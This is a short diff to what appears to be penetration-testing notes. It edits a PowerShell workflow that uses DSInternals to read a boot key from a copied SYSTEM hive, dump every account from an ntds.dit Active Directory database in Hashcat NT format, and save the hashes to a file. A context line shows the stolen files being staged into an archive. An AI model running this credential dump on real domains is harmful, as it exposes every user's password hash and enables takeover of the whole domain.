@@ -12,7 +12,7 @@ Compress-Archive -Path C:\Users\Public\Downloads\poon -DestinationPath C:\Users\
 Import-Module DSInternals
 $Key = Get-BootKey -SystemHiveFilePath C:\Users\p4yl0ad\Desktop\AD\poon\registry\SYSTEM
  
-Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\ntds.dit' -All |
+Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\Active Directory\ntds.dit' -All |
   Format-Custom -View HashcatNT | 
   Out-File C:\Users\p4yl0ad\Desktop\AD\poon\Hashdump.txt
  ```
